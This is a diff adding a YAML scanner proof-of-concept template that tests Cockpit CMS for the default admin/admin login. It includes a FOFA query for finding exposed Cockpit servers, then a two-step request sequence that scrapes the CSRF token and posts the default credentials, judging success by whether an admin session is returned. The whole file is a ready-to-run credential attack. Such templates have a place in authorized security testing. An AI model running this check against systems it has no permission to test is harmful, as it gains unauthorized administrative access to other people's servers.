@@ -1,0 +1,35 @@
+id: poc-yaml-cockpit-default-login
+info:
+  name: Cockpit 内容平台默认口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: cockpit
+  fofa: title="Authenticate Please!" || header="Cockpit_" || banner="Cockpit_" ||
+    body="Cockpit/assets/cockpit.js"
+requests:
+- method: GET
+  path: /auth/login?to=/
+  expression: 'status_code == 200 &&
+
+    matches(body,"csrf \x3a \".*?\"")
+
+    '
+  output:
+  - regex_match(body,"csrf \x3a \"(?P<t1>.*?)\"")
+- method: POST
+  path: /auth/check
+  headers:
+    Content-Type: application/json; charset=UTF-8
+  data: '{"auth":{"user":"admin","password":"admin"},"csrf":"{{.t1}}"}
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"success\":true") &&
+
+    contains(body,"group\":\"admin\",\"name\":\"Admin\",\"active\":true")
+
+    '
+variables: {}
+transport: http
